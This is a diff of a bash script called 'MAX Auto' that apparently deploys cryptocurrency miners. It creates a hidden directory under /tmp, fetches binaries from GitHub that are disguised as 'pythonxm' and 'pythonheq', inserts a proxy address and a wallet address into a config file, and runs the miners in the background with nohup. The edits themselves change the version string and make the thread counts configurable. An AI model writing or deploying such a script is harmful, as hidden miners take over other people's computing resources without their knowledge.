@@ -1,6 +1,6 @@
 #!/bin/bash -xe
 echo -e '####################################################################################'
-echo -e '##################   '"MAX  Auto"' Ver:0.2.17 Debug     ############################'
+echo -e '##################   '"MAX  Auto"' Ver:0.2.19      ############################'
 echo -e '####################################################################################'
 mkdir -p /tmp/.max/
 cd  /tmp/.max/
@@ -232,7 +232,7 @@ then
     sed -i "s+78.47.69.185+$PROX+g" config.json
     sed -i "s+44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p+$W_XM+g" config.json
 
-    nohup ./pythonxm -c config.json -l ooutxm 2>> ooutxm 1>> ooutxm &
+    nohup ./pythonxm -c config.json -t "$XMThreads" -l ooutxm 2>> ooutxm 1>> ooutxm &
 
 else
     ###### VC
@@ -241,7 +241,7 @@ else
     wget -q https://github.com/one10001/10001code/raw/main/pythonheq
     chmod +x pythonheq
 
-    nohup ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."VC_""$INFO" -t 4 1>> ooutvc 2>> ooutvc &
+    nohup ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."VC_""$INFO" -t "$VCThreads" 1>> ooutvc 2>> ooutvc &
 
 fi
 
